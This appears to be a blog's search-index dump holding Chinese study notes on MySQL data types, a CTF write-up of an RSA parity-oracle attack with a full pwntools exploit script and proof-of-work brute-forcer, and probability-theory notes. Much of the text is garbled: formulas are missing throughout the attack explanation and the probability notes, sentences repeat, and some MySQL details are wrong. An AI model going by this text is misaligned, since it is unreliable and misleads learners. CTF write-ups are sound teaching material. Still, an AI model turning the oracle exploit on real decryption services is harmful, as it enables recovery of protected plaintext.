|#+--------------------+#| information_schema |#| mysql              |#| performance_schema |#| sys                |#| name               |#+--------------------+#5 rows in set (0.00 sec)\n语法：\nCREATE DATABASE [IF NOT EXISTS] db_name [create_specification] [,create_specification] ...]create_specification:\t[DEFAULT] CHARACTER SET charset_name\t[DEFAULT] COLLATE collation_name#大写的表示是关键字#[]是可选项#CHARACTER SET：指定数据库采用的字符集#COLLATE：指定数据库字符集的校验规则\n2.6.3 选中/使用数据库use [name];\n#Expected output:#Database changed\n2.6.4 删除数据库drop database [name];\n语法：\nDROP DATABASE [IF EXISTS] db_name\n#Expected output:#Query OK, 0 row affected (0.00 sec)\n 一旦删除数据库，这里的数据通过常规的手段就找不回来了！！！所以删除数据库是一个非常危险的操作！！在工作中，无论如何都不要使用drop database操作，尤其是针对线上环境~\n2.7 数据类型数据类型（data_type）是指系统中所允许的数据的类型。数据库中的每个列都应该有适当的数据类型，用于限制或允许该列中存储的数据。例如，列中存储的为数字，则相应的数据类型应该为数值类型。\n如果使用错误的数据类型可能会严重影响应用程序的功能和性能，所以在设计表时，应该特别重视数据列所用的数据类型。更改包含数据的列不是一件小事，这样做可能会导致数据丢失。因此，在创建表时必须为每个列设置正确的数据类型和长度。\nMySQL 的数据类型有大概可以分为整数类型、浮点数类型和定点数类型、日期和时间类型、字符串类型、二进制类型等。\n注意： 整数类型和浮点数类型可以统称为数值数据类型。\n\n数值类型：整数类型包括 TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT，浮点数类型包括 FLOAT 和 DOUBLE，定点数类型为 DECIMAL。\n日期/时间类型：包括 YEAR、TIME、DATE、DATETIME 和 TIMESTAMP。\n字符串类型：包括 CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM 和 SET 等。\n二进制类型：包括 BIT、BINARY、VARBINARY、TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。\n\n\n2.7.1 数值类型整数类型MySQL 主要提供的整数类型有 TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT，其属性字段可以添加 AUTO_INCREMENT 自增约束条件。\n\n从上表中可以看到，不同类型的整数存储所需的字节数不相同，占用字节数最小的是 TINYINT 类型，占用字节最大的是 BIGINT 类型，占用的字节越多的类型所能表示的数值范围越大。\n根据占用字节数可以求出每一种数据类型的取值范围。例如，TINYINT 需要 1 个字节（8bit）来存储，那么 TINYINT 无符号数的最大值为 28-1，即 255；TINYINT 有符号数的最大值为 27-1，即 127。其他类型的整数的取值范围计算方法相同，如下表所示。\n\n提示： 显示宽度和数据类型的取值范围是无关的。显示宽度只是指明 MySQL 最大可能显示的数字个数，数值的位数小于指定的宽度时会由空格填充。如果插入了大于显示宽度的值，只要该值不超过该类型整数的取值范围，数值依然可以插入，而且能够显示出来。例如，year 字段插入 19999，当使用 SELECT 查询该列值的时候，MySQL 显示的将是完整的带有 5 位数字的 19999，而不是 4 位数字的值。\n其他整型数据类型也可以在定义表结构时指定所需的显示宽度，如果不指定，则系统为每一种类型指定默认的宽度值。\n不同的整数类型有不同的取值范围，并且需要不同的存储空间，因此应根据实际需要选择最合适的类型，这样有利于提高查询的效率和节省存储空间。\n浮点类型MySQL 中使用浮点数和定点数来表示小数。\n浮点类型有两种，分别是单精度浮点数（FLOAT）和双精度浮点数（DOUBLE）；定点类型只有一种，就是 DECIMAL。\n浮点类型和定点类型都可以用(M, D)来表示，其中 M 称为精度，表示总共的位数；D 称为标度，表示小数的位数。\n浮点数类型的取值范围为 M（1～255）和 D（1～30，且不能大于 M-2），分别表示显示宽度和小数位数。M 和 D 在 FLOAT 和DOUBLE 中是可选的，FLOAT 和 DOUBLE 类型将被保存为硬件所支持的最大精度。DECIMAL 的默认 D 值为 0、M 值为 10。\n下表中列出了 MySQL 中的小数类型和存储需求。\n\nDECIMAL 类型不同于 FLOAT 和 DOUBLE。DOUBLE 实际上是以字符串的形式存放的，DECIMAL 可能的最大取值范围与 DOUBLE 相同，但是有效的取值范围由 M 和 D 决定。如果改变 M 而固定 D，则取值范围将随 M 的变大而变大。\n从上表中可以看到，DECIMAL 的存储空间并不是固定的，而由精度值 M 决定，占用 M+2 个字节。\nFLOAT 类型的取值范围如下：\n\n有符号的取值范围：-3.402823466E+38～-1.175494351E-38。\n无符号的取值范围：0 和 -1.175494351E-38～-3.402823466E+38。\n\nDOUBLE 类型的取值范围如下：\n\n有符号的取值范围：-1.7976931348623157E+308～-2.2250738585072014E-308。\n无符号的取值范围：0 和 -2.2250738585072014E-308～-1.7976931348623157E+308。\n\n提示：\n\n不论是定点还是浮点类型，如果用户指定的精度超出精度范围，则会四舍五入进行处理。\nFLOAT 和 DOUBLE 在不指定精度时，默认会按照实际的精度（由计算机硬件和操作系统决定），DECIMAL 如果不指定精度，默认为（10，0）。\n浮点数相对于定点数的优点是在长度一定的情况下，浮点数能够表示更大的范围；缺点是会引起精度问题。\n在 MySQL 中，定点数以字符串形式存储，在对精度要求比较高的时候（如货币、科学数据），使用 DECIMAL 的类型比较好\n另外两个浮点数进行减法和比较运算时也容易出问题，所以在使用浮点数时需要注意，并尽量避免做浮点数比较。\n\n\n2.7.2 日期和时间类型MySQL 中有多处表示日期的数据类型：YEAR、TIME、DATE、DTAETIME、TIMESTAMP。当只记录年信息的时候，可以只使用 YEAR 类型。\n每一个类型都有合法的取值范围，当指定确定不合法的值时，系统将“零”值插入数据库中。\n\nYEAR 类型YEAR 类型是一个单字节类型，用于表示年，在存储时只需要 1 个字节。可以使用各种格式指定 YEAR，如下所示：\n\n以 4 位字符串或者 4 位数字格式表示的 YEAR，范围为 ‘1901’～’2155’。输入格式为 ‘YYYY’ 或者 YYYY，例如，输入 ‘2010’ 或 2010，插入数据库的值均为 2010。\n以 2 位字符串格式表示的 YEAR，范围为 ‘00’ 到 ‘99’。’00’～’69’ 和 ‘70’～’99’ 范围的值分别被转换为 2000～2069 和 1970～1999 范围的 YEAR 值。’0’ 与 ‘00’ 的作用相同。插入超过取值范围的值将被转换为 2000。\n以 2 位数字表示的 YEAR，范围为 1～99。1～99 和 70～99 范围的值分别被转换为 2001～2069 和 1970～1999 范围的 YEAR 值。注意，在这里 0 值将被转换为 0000，而不是 2000。\n\n提示： 两位整数范围与两位字符串范围稍有不同。例如，插入 3000 年，读者可能会使用数字格式的 0 表示 YEAR，实际上，插入数据库的值为 0000，而不是所希望的 3000。只有使用字符串格式的 ‘0’ 或 ‘00’，才可以被正确解释为 3000，非法 YEAR值将被转换为 0000。\nTIME 类型TIME 类型用于只需要时间信息的值，在存储时需要 3 个字节。格式为 HH:MM:SS。HH 表示小时，MM 表示分钟，SS 表示秒。\nTIME 类型的取值范围为 -838：59：59～838：59：59，小时部分如此大的原因是 TIME 类型不仅可以用于表示一天的时间（必须小于 24 小时），还可能是某个事件过去的时间或两个事件之间的时间间隔（可大于 24 小时，或者甚至为负）。\n可以使用各种格式指定 TIME 值，如下所示。\n\n‘D HH：MM：SS‘ 格式的字符串。还可以使用这些“非严格”的语法：’HH：MM：SS‘、’HH：MM‘、’D HH‘ 或 ‘SS‘。这里的 D 表示日，可以取 0～34 之间的值。在插入数据库时，D 被转换为小时保存，格式为 “D*24+HH”。\n‘HHMMSS‘ 格式、没有间隔符的字符串或者 HHMMSS 格式的数值，假定是有意义的时间。例如，’101112’ 被理解为’10：11：12’，但是 ‘106112’ 是不合法的（它有一个没有意义的分钟部分），在存储时将变为 00：00：00。\n\n为 TIME 列分配简写值时应注意：\n\n如果没有冒号，MySQL 解释值时，假定最右边的两位表示秒。（MySQL 解释 TIME 值为过去的时间而不是当前的时间）。例如，读者可能认为 ‘1112’ 和 1112 表示 11：12：00（即 11 点过 12 分钟），但MySQL 将它们解释为 00：11：12（即 11 分 12 秒）。同样 ‘12’ 和 12 被解释为00：00：12。\n相反，TIME 值中如果使用冒号则肯定被看作当天的时间，也就是说，’11：12’ 表示 11：12：00，而不是 00：11：12。\n\nDATE 类型DATE 类型用于仅需要日期值时，没有时间部分，在存储时需要 3 个字节。日期格式为 ‘YYYY-MM-DD‘，其中 YYYY 表示年，MM 表示月，DD 表示日。\n在给 DATE 类型的字段赋值时，可以使用字符串类型或者数字类型的数据插入，只要符合 DATE 的日期格式即可。如下所示：\n\n以 ‘YYYY-MM-DD‘ 或者 ‘YYYYMMDD‘ 字符中格式表示的日期，取值范围为 ‘1000-01-01’～’9999-12-3’。例如，输入 ‘2015-12-31’ 或者 ‘20151231’，插入数据库的日期为2015-12-31。\n以 ‘YY-MM-DD‘ 或者 ‘YYMMDD‘ 字符串格式表示日期，在这里YY表示两位的年值。MySQL 解释两位年值的规则：’00～69’ 范围的年值转换为 ‘2000-2069’，’70-99’ 范围的年值转换为 ‘1970～1999’。例如，输入 ‘15-12-31’，插入数据库的日期为 2015-12-31；输入 ‘991231’，插入数据库的日期为 1999-12-31。\n以YYMMDD 数字格式表示的日期，与前面相似，00~69 范围的年值转换为 2000～2069，80～99 范围的年值转换为 1980～1999。例如，输入 151231，插入数据库的日期为 2015-12-31，输入 991231，插入数据库的日期为 1999-12-31。\n使用 CURRENT_DATE 或者 NOW()，插入当前系统日期。\n\nMySQL 允许“不严格”语法： 任何标点符号都可以用作日期部分之间的间隔符。例如，’98-11-31’、’98.11.31’、’98/11/31’和’98@11@31’ 是等价的，这些值也可以正确地插入数据库。\nDATETIME 类型DATETIME 类型用于需要同时包含日期和时间信息的值，在存储时需要 8 个字节。日期格式为 ‘YYYY-MM-DD HH：MM：SS‘，其中 YYYY 表示年，MM 表示月，DD 表示日，HH 表示小时，MM 表示分钟，SS 表示秒。\n在给 DATETIME 类型的字段赋值时，可以使用字符串类型或者数字类型的数据插入，只要符合 DATETIME 的日期格式即可，如下所示。\n\n以 ‘YYYY-MM-DD HH：MM：SS‘ 或者 ‘YYYYMMDDHHMMSS‘ 字符串格式表示的日期，取值范围为 ‘1000-01-01 00：00：00’～’9999-12-3 23：59：59’。例如，输入 ‘2014-12-31 05：05：05’ 或者 ‘20141231050505’，插入数据库的 DATETIME 值都为 2014-12-31 05：05：05。\n以 ‘YY-MM-DD HH：MM：SS‘ 或者 ‘YYMMDDHHMMSS‘ 字符串格式表示的日期，在这里 YY 表示两位的年值。与前面相同，’00～79’ 范围的年值转换为 ‘2000～2079’，’80～99’ 范围的年值转换为 ‘1980～1999’。例如，输入 ‘14-12-31 05：05：05’，插入数据库的 DATETIME 为 2014-12-31 05：05：05；输入 141231050505，插入数据库的 DATETIME 为 2014-12-31 05：05：05。\n以 YYYYMMDDHHMMSS 或者 YYMMDDHHMMSS 数字格式表示的日期和时间。例如，输入 20141231050505，插入数据库的 DATETIME 为 2014-12-31 05：05：05；输入 140505050505，插入数据库的 DATETIME 为 2014-12-31 05：05：05。\n\nMySQL 允许“不严格”语法： 任何标点符号都可用作日期部分或时间部分之间的间隔符。例如，’98-12-31 11：30：45’、’98.12.31 11+30+35’、’98/12/31 113045’ 和 ‘98@12@31 11^30^45’ 是等价的，这些值都可以正确地插入数据库。\nTIMESTAMP 类型TIMESTAMP 的显示格式与 DATETIME 相同，显示宽度固定在 19 个字符，日期格式为 YYYY-MM-DD HH：MM：SS，在存储时需要 4 个字节。但是 TIMESTAMP 列的取值范围小于 DATETIME 的取值范围，为 ‘1970-01-01 00：00：01’UTC～’2038-01-19 03：14：07’UTC。在插入数据时，要保证在合法的取值范围内。\n提示： 协调世界时（英：Coordinated Universal Time，法：Temps Universel Coordonné）又称为世界统一时间、世界标准时间、国际协调时间。英文（CUT）和法文（TUC）的缩写不同，作为妥协，简称 UTC。\nTIMESTAMP 与 DATETIME 除了存储字节和支持的范围不同外，还有一个最大的区别是：\n\nDATETIME 在存储日期数据时，按实际输入的格式存储，即输入什么就存储什么，与时区无关；\n而 TIMESTAMP 值的存储是以 UTC（世界标准时间）格式保存的，存储时对当前时区进行转换，检索时再转换回当前时区。即查询时，根据当前时区的不同，显示的时间值是不同的。\n\n提示： 如果为一个 DATETIME 或 TIMESTAMP 对象分配一个 DATE 值，结果值的时间部分被设置为 ‘00：00：00’，因此 DATE 值未包含时间信息。如果为一个 DATE 对象分配一个 DATETIME 或 TIMESTAMP 值，结果值的时间部分被删除，因此DATE 值未包含时间信息。\n\n2.7.3 字符串类型字符串类型用来存储字符串数据，还可以存储图片和声音的二进制数据。字符串可以区分或者不区分大小写的串比较，还可以进行正则表达式的匹配查找。\nMySQL 中的字符串类型有 CHAR、VARCHAR、TINYTEXT、TEXT、MEDIUMTEXT、LONGTEXT、ENUM、SET 等。\n下表中列出了 MySQL 中的字符串数据类型，括号中的 M 表示可以为其指定长度。\n\nVARCHAR 和 TEXT 类型是变长类型，其存储需求取决于列值的实际长度（在前面的表格中用 L 表示），而不是取决于类型的最大可能尺寸。\n例如，一个 VARCHAR(10) 列能保存一个最大长度为 10 个字符的字符串，实际的存储需要字符串的长度 L 加上一个字节以记录字符串的长度。对于字符 “abcd”，L 是 4，而存储要求 5 个字节。\nCHAR 和 VARCHAR 类型CHAR(M) 为固定长度字符串，在定义时指定字符串列长。当保存时，在右侧填充空格以达到指定的长度。M 表示列的长度，范围是 0～255 个字符。\n例如，CHAR(4) 定义了一个固定长度的字符串列，包含的字符个数最大为 4。当检索到 CHAR 值时，尾部的空格将被删除。\nVARCHAR(M) 是长度可变的字符串，M 表示最大列的长度，M 的范围是 0～65535。VARCHAR 的最大实际长度由最长的行的大小和使用的字符集确定，而实际占用的空间为字符串的实际长度加 1。\n例如，VARCHAR(50) 定义了一个最大长度为 50 的字符串，如果插入的字符串只有 10 个字符，则实际存储的字符串为 10 个字符和一个字符串结束字符。VARCHAR 在值保存和检索时尾部的空格仍保留。\n实例： 下面将不同的字符串保存到 CHAR(4) 和 VARCHAR(4) 列，说明 CHAR 和 VARCHAR 之间的差别，如下表所示。\n\n对比结果可以看到，CHAR(4) 定义了固定长度为 4 的列，无论存入的数据长度为多少，所占用的空间均为 4 个字节。VARCHAR(4) 定义的列所占的字节数为实际长度加 1。\nTEXT 类型TEXT 列保存非二进制字符串，如文章内容、评论等。当保存或查询 TEXT 列的值时，不删除尾部空格。\nTEXT 类型分为 4 种：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。不同的 TEXT 类型的存储空间和数据长度不同。\n\nTINYTEXT 表示长度为 255字符的 TEXT 列。\nTEXT 表示长度为 65535字符的 TEXT 列。\nMEDIUMTEXT 表示长度为 16777215字符的 TEXT 列。\nLONGTEXT 表示长度为 4294967295 或 4GB 字符的 TEXT 列。\n\nENUM 类型ENUM 是一个字符串对象，值为表创建时列规定中枚举的一列值。其语法格式如下：\n&lt;字段名&gt; ENUM( &#x27;值1&#x27;, &#x27;值1&#x27;, …, &#x27;值n&#x27; )\n字段名指将要定义的字段，值 n 指枚举列表中第 n 个值。\nENUM 类型的字段在取值时，能在指定的枚举列表中获取，而且一次只能取一个。如果创建的成员中有空格，尾部的空格将自动被删除。\nENUM 值在内部用整数表示，每个枚举值均有一个索引值；列表值所允许的成员值从 1 开始编号，MySQL 存储的就是这个索引编号，枚举最多可以有 65535 个元素。\n例如，定义 ENUM 类型的列（’first’，’second’，’third’），该列可以取的值和每个值的索引如下表所示。\n\nENUM 值依照列索引顺序排列，并且空字符串排在非空字符串前，NULL 值排在其他所有枚举值前。\n提示： ENUM 列总有一个默认值。如果将 ENUM 列声明为 NULL，NULL 值则为该列的一个有效值，并且默认值为 NULL。如果 ENUM 列被声明为 NOT NULL，其默认值为允许的值列表的第 1 个元素。\nSET 类型SET 是一个字符串的对象，可以有零或多个值，SET 列最多可以有 64 个成员，值为表创建时规定的一列值。指定包括多个 SET 成员的 SET 列值时，各成员之间用逗号,隔开，语法格式如下：\nSET( &#x27;值1&#x27;, &#x27;值2&#x27;, …, &#x27;值n&#x27; )\n与 ENUM 类型相同，SET 值在内部用整数表示，列表中每个值都有一个索引编号。当创建表时，SET 成员值的尾部空格将自动删除。\n但与 ENUM 类型不同的是，ENUM 类型的字段只能从定义的列值中选择一个值插入，而 SET 类型的列可从定义的列值中选择多个字符的联合。\n提示： 如果插入 SET 字段中的列值有重复，则 MySQL 自动删除重复的值；插入 SET 字段的值的顺序并不重要，MySQL 会在存入数据库时，按照定义的顺序显示；如果插入了不正确的值，默认情况下，MySQL 将忽视这些值，给出警告。\n\n2.7.4 二进制类型MySQL 支持两类字符型数据：文本字符串和二进制字符串。二进制字符串类型有时候也直接被称为“二进制类型”。\nMySQL 中的二进制字符串有 BIT、BINARY、VARBINARY、TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。\n下表中列出了 MySQL 中的二进制数据类型，括号中的 M 表示可以为其指定长度。\n\nBIT 类型位字段类型。M 表示每个值的位数，范围为 1～64。如果 M 被省略，默认值为 1。如果为 BIT(M) 列分配的值的长度小于 M 位，在值的左边用 0 填充。例如，为 BIT(6) 列分配一个值 b’101’，其效果与分配 b’000101’ 相同。\nBIT 数据类型用来保存位字段值，例如以二进制的形式保存数据 13，13 的二进制形式为 1101，在这里需要位数至少为 4 位的 BIT 类型，即可以定义列类型为 BIT(4)。大于二进制 1111 的数据是不能插入BIT(4) 类型的字段中的。\n提示： 默认情况下，MySQL 不可以插入超出该列允许范围的值，因而插入数据时要确保插入的值在指定的范围内。\nBINARY 和 VARBINARY 类型BINARY 和 VARBINARY 类型类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字节字符串。使用的语法格式如下：\n列名称 BINARY(M) 或者 VARBINARY(M)\nBINARY 类型的长度是固定的，指定长度后，不足最大长度的，将在它们右边填充 “\\0” 补齐，以达到指定长度。例如，指定列数据类型为 BINARY(3)，当插入 a 时，存储的内容实际为 “\\a0\\0”，当插入 ab 时，实际存储的内容为“ab\\0”，无论存储的内容是否达到指定的长度，存储空间均为指定的值 M。\nVARBINARY 类型的长度是可变的，指定好长度之后，长度可以在 0 到最大值之间。例如，指定列数据类型为 VARBINARY(20)，如果插入的值长度只有 10，则实际存储空间为 10 加 1，实际占用的空间为字符串的实际长度加 1。\nBLOB 类型BLOB 是一个二进制的对象，用来存储可变数量的数据。BLOB 类型分为 4 种：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB，它们可容纳值的最大长度不同，如下表所示。\n\n\nBLOB 列存储的是二进制字符串（字节字符串），TEXT 列存储的是非进制字符串（字符字符串）。\nBLOB 列是字符集，并且排序和比较基于列值字节的数值；TEXT 列有一个字符集，并且根据字符集对值进行排序和比较。\n\n\n2.7.5 Linkhttps://mp.weixin.qq.com/s?__biz=MzA5NzQxOTE4NA==&amp;mid=2247484005&amp;idx=1&amp;sn=9cfc06b6605cfc10056971a745e400e2&amp;chksm=90a068baa7d7e1ac5f14f0b42d54ebb8effc1b1e9bb6035f22ea1eb6d2ad2dcfd35fc6323e0b&amp;scene=27\n2.8 表的操作需要操作数据库中的表时，需要先使用该数据库\nuse db_test;\n2.8.1 查看表结构desc [name]\n表结构的具体解释：\n\n2.8.2 创建表create table table_name(datatype1,datatype2,...);\n2.8.3 删除表drop table table_name;\n语法：\nDROP [TEMPORARY] TABLE [IF EXISTS] tbl_name [, tbl_name] ...\n","categories":["MySQL"],"tags":["MySQL"]},{"title":"Parity_RSA 二分法攻击","url":"/2023/03/10/Parity/","content":"Parity_RSA[QCTF] baby_rsa\nAnalyze先看题：\nimport socketserverfrom secret import flagimport signalfrom Crypto.Util.number import *import randomimport stringfrom hashlib import sha256table = string.ascii_letters + string.digitsmenu = b'''Give me your information and I'll tell you about the parity after decryption.Let me see your options...1.encrypt message2.get flag3.exit'''e = 0x10001p = getPrime(512)q = getPrime(512)N = p * qphi = (p - 1) * (q - 1)d = inverse(e, phi)class Task(socketserver.BaseRequestHandler):    def _recvall(self):        BUFF_SIZE = 2048        data = b''        while True:            part = self.request.recv(BUFF_SIZE)            data += part            if len(part) &lt; BUFF_SIZE:                break        return data.strip()    def send(self, msg, newline=True):        try:            if newline:                msg += b'\\n'            self.request.sendall(msg)        except:            pass    def recv(self, prompt=b'[-] '):        self.send(prompt, newline=False)        return self._recvall()    def proof_of_work(self):        proof = (''.join([random.choice(table) for _ in range(12)])).encode()        sha = sha256(proof).hexdigest().encode()        self.send(b\"[+] sha256(XXXX+\" + proof[4:] + b\") == \" + sha)        XXXX = self.recv(prompt=b'[+] Give Me XXXX :')        if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha:            return False        return True    def handle(self):        print(1)        signal.alarm(2400)        if not self.proof_of_work():            self.send(b'bye~')            return        self.send(menu)        self.send(('e = ' + hex(e)).encode())        self.send(('N = ' + hex(N)).encode())        while True:            num = self.recv(prompt=b'what\\'s your choise?')            if num == b'1':                c = int(self.recv(prompt=b'the message:').decode(), 16)                m = pow(c, d, N)                if m % 2:                    self.send(b'odd...')                if m % 2 == 0:                    self.send(b'even...')            elif num == b'2':                c = pow(bytes_to_long(flag, e, N))                self.send(('c = ' + hex(c)).encode())            elif num == b'3':                self.send(b'bye~')                return            else:                return        class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer):    passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer):    passif __name__ == \"__main__\":    HOST, PORT = '0.0.0.0', 10000    server = ForkedServer((HOST, PORT), Task)    server.allow_reuse_address = True    print(HOST, PORT)    server.serve_forever()\n先nc一下题目提供的端口：\nncat scr1w.dlut.edu.cn 28088#Output:#[+] sha256(XXXX+iemdocJd) == 419017b5ab02fca75dc806b09ce4bbec1fafe03292d5e17a54551cb2d00b7f40#[+] Give Me XXXX :\n简单的sha256爆破：\nfrom pwn import *from hashlib import sha256from gmpy2 import *def break_sha(last, shav):    s = string.ascii_letters + string.digits    for v1 in s:        for v2 in s:            for v3 in s:                for v4 in s:                    t = (v1 + v2 + v3 + v4).encode() + last                    if sha256(t).hexdigest() == shav:                        return (v1 + v2 + v3 + v4).encode()s1=b'iemdocJd's2=b'ee2571d3f23fb615fdbe01cea04a20352920f0b02c65e06fc14aa71cb20067e1'print(break_sha(s1,s2.decode()))\n#Output:#Give me your information and I'll tell you about the parity after decryption.#Let me see your options...#1.encrypt message#2.get flag#3.exit##e = 0x10001#N = #0xab068236ae895f50991b85a495b05cab628f23408c6847aa19cb91e6b22e5b1a4e67d1c99b36f53da55230a26b496cb60a5092c728a24ffc0e5a195a456481f1e4c82512af6b8003e092045aa0b3dc79c4d12beea95729e6c1fce16215e0ef47d77bb3dc7417006a16af9b88841627c4462608af4e6d4fa8f369d126cf8bbad9#what's your choise?#Input:#2#Output:#c = 0x5fff63ca6bbf96b571128a2502bee3de7be1be0cb84e6f70c2750aaf174475335e0cb59a54a2811154b2c76dd01a2a05660b5485efbfc956d05f254b9fbac53644eea31ea59cc8a8782b4618558aeff0129d85d24dbc0adf431d0929a26803035cff7a2cbc7da52c4dee682078d46e15c2849898fa3defbc700c5878314ae646\n通过输入一个加密的密文，服务器会告诉你用私钥d解密该密文后，所得的明文结果是even还是odd，通过这种机制，我们可以向服务器传入的值进行一些修改操作，我们传入 即 为，而服务器会将解密成后告诉我们其模下的奇偶性。即为，而服务器会将解密成后告诉我们其模下的奇偶性。即为，而服务器会将解密成后告诉我们其模下的奇偶性。\n我们知道任意一个自然数,其与的乘积一定为偶数，所以在下：\n若，即解密后的传入参数没有经过取模操作的话,那么其奇偶性一定为even，因为为偶数\n若，即解密后的传入参数经过了取模操作，那么其奇偶性一定为odd，因为为偶数，为奇数\n根据上面两点我们可以得到以下结论：\n若返回even，则\n若返回odd，即\n通过返回的结果，我们可以将明文所在的缩小到原来范围的，若我们继续传入，则可将范围再次缩小\n如此进行下去，我们只需要次即可得到\n\nEXPfrom pwn import *from hashlib import sha256from gmpy2 import *from Crypto.Util.number import *e = 0x10001n = 0x93022347fcf4a51c3a62dc83e93f4dc91dc6331b5541cd912fd7e0891a8419ce77fce50220cff791d9d7ca4f3af19531a3358a0301f85f284441a4ea9b38c84aa7901a11c9f6a5d6305933635294197d2f6cd63f9649ca9669a766e7f802a668d9b265d30fe8b657d369919ad278c52de26fac04e42f750999cce7dd6eb75a0fc = 0xec722e27f20c32794072fa699c7a657bee39134accd623166c785a8e44f22a5523274f68eda3c75a5117ddc9cc13fcfd611a4971530a6e6bf166b3cfdf7e92fd943c17d8b25990bfe24bc7718232789e4e2126b08d7117b4c90aa0702ef83d9cf98583f02c819676535e60c84f918dec8cd57a39dbf2d5a62924339cc00f665def break_sha(last, shav):    s = string.ascii_letters + string.digits    for v1 in s:        for v2 in s:            for v3 in s:                for v4 in s:                    t = (v1 + v2 + v3 + v4).encode() + last                    if sha256(t).hexdigest() == shav:                        return (v1 + v2 + v3 + v4).encode()ldata=0rdata=nnum=0io = remote(\"scr1w.dlut.edu.cn\", 28092)io.recvuntil(b'sha256(XXXX+')str1 = io.recvuntil(b')', drop=True)print(str1)io.recvuntil(b'== ')str2 = io.recvuntil(b'\\n', drop=True)print(str2)res = break_sha(str1, str2.decode())print(res)io.recvuntil(b'[+] Give Me XXXX :')io.sendline(res)while rdata-ldata&gt;2:    num+=1    t=powmod(2,num*e,n)    data=hex((c*t)%n)[2:]    io.recvuntil(b\"what's your choise?\")    io.sendline(b'1')    # io.recvuntil(b'the message:')    io.recv()    io.sendline(data)    ans=io.recvline()    print(ans)    if ans==b'odd...\\n':        ldata = (ldata + rdata) // 2 if (ldata + rdata) % 2 == 0 else (ldata + rdata) // 2 + 1    elif ans==b'even...\\n':        rdata = (ldata + rdata) // 2 if (ldata + rdata) % 2 == 0 else (ldata + rdata) // 2 + 1    print(rdata-ldata)    # print(ldata,rdata)# while powmod(ldata,e,n)!=c:#     ldata-=1print(\"l=\",ldata)print(\"r=\",rdata)print(long_to_bytes(ldata))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"概率论与数理统计知识梳理（二）","url":"/2023/04/04/Probability-theory-and-mathematical-statistics_Chapter_2/","content":"概率论与数理统计第二章 随机变量及其分布2.1 随机变量及其分布函数\n随机变量的定义：设为一个样本空间，若对任意，都有一个实数与之对应，则称为一个随机变量\n\n分布函数的定义：设为一个随机变量，称为随机变量的分布函数\n\n分布函数的性质\n\n\n为的右连续函数，即对\n为的单调不减函数\n\n\n\n\n2.2 离散型随机变量\n分布列的定义：如果随机变量的所有可能取值为一列离散的点，，则称为一个离散型随机变量，并称概率为的分布列，可以记作下面的形式\n\n\\begin{align}\nX\\sim\n\\left(\\begin {array}{c}\nx_1&x_2&x_3&...\\\\\np_1&p_2&p_3&...\\\\\n\\end{array}\\right)\n\\end{align}\n离散型随机变量的分布函数必定为阶梯函数，反之，分布函数为阶梯函数的随机变量必为离散型随机变量\n\n离散型随机函数的分布函数的性质\n\n非负性：\n归一性：\n\n\n常见的离散型随机变量\n\n二项分布：，其中，称为分布\n泊松分布：，其中\n泊松逼近定理：\n二项分布的极限是泊松分布\n几何分布：\n几何分布的无记忆性：设服从参数为的几何分布，那么对任何正整数，都有\n超几何分布：，其中\n\n\n\n2.3 连续型随机变量\n密度函数的定义：设为一个随机变量，如果存在一个可积函数，使得的分布函数满足，则称为一个连续型随机变量，并称为的概率密度函数\n\n密度函数的性质\n\n非负性：\n归一性：\n由归一性可知，介于密度函数曲线与轴之间的图形的面积为\n在密度函数的连续点处有，即密度函数为分布函数的导数\n如果为连续型随机变量，则\n\n\n常见的连续型随机变量\n\n均匀分布：\n\n\\begin{align}\n&X\\sim U(a,b)\\Rightarrow\\\\\n&密度函数：f(x)=\n\\begin {cases}\n\\frac{1}{b-a}&a","categories":["Study"],"tags":["Study","Probability theory","Mathematical statistics"]},{"title":"概率论与数理统计知识梳理（一）","url":"/2023/04/03/Probability-theory-and-mathematical-statistics_Chapter_1/","content":"概率论与数理统计第一章 概率论的基本概念1.1 随机事件及其运算\n随机现象（随机事件）的特征\n该试验可在相同条件下重复进行\n所有可能出现的结果是已知的\n试验之前不可预知哪个结果会出现\n\n\n以表示随机试验的所有可能结果组成的集合，并称之为随机试验对应的样本空间，的元素称为样本点，即样本点就是可能结果\n\n随机事件对应的样本空间的子集称为随机试验的随机事件\n\n事件的包含与相等\n\n若事件的每一个样本点都包含在事件中，则称事件包含事件，记作。\n\n若且，则称事件与相等，记为\n\n\n\n和事件\n\n与的和事件记作或\n\n\n积事件\n\n与的积事件记作或\n\n\n差事件\n\n与的差事件记作，发生的充要条件为发生而不发生\n\n\n补事件\n\n设为随机事件，称为事件的补事件\n\n\n\n互不相容\n\n若，则称与互不相容，或互斥\n\n\n事件运算原则\n\n交换率：\n结合律：\n分配率：\n德摩根率：\n\n\n\n1.2 概率的定义及其基本性质\n频率的定义\n设是随机试验，是它的样本空间，为的一个事件，将试验重复进行次，其中事件发生了次，则称为发生的频率，记作\n\n\n频率的性质\n\n非负性：\n归一性：\n有限可加性：若为两两互不相容的事件，则有\n\n\n频率是概率的统计学定义\n\n概率的定义\n\n非负性：\n归一性：\n可加性：若为两两互不相容的事件，则有\n\n\n概率的性质\n\n\n有限可加性：若为两两互不相容的事件，则有\n若，则\n\n减法公式：\n加法公式：\n\n\n\n1.3 